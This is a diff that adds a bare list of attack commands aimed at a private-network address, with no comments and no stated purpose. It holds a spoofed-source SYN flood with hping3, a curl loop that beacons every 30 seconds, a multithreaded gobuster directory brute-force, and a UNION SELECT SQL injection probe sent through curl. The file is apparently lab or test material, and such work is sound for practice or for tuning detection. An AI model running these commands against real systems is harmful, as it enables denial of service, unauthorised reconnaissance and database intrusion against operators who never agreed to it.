@@ -1,0 +1,11 @@
+hping3 -S --flood -p 80 --rand-source 192.168.100.18
+
+while true; do
+  curl -s http://192.168.100.18:8080/beacon -o /dev/null
+  sleep 30
+done
+
+
+gobuster dir -u http://192.168.100.18 -w /usr/share/wordlists/dirb/common.txt -t 50
+
+curl "http://192.168.100.18/search?q=1%20UNION%20SELECT%20null,null,null--"
